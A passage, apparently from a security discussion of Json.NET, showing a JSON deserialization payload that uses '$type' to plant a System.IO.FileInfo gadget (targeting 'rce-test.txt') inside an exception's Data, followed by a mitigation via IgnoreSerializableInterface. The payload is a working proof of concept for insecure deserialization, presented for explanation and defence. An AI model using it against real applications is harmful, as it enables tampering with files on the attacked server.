        {
          "$type": "System.Exception, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
          "ClassName": "System.Exception",
          "Message": "naughty exception",
          "Data": {
            "$type": "System.Collections.ListDictionaryInternal, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "data": {
              "$type": "System.IO.FileInfo, System.IO.FileSystem",
              "fileName": "rce-test.txt",
              "IsReadOnly": true    
            }
          },
        }
    The attack can be mitigated without creation of a custom serialization binder by setting [`DefaultContractResolver.IgnoreSerializableInterface = true`](https://www.newtonsoft.com/json/help/html/P_Newtonsoft_Json_Serialization_DefaultContractResolver_IgnoreSerializableInterface.htm).  Of course, this may cause problems with serialization of certain .Net class library types.
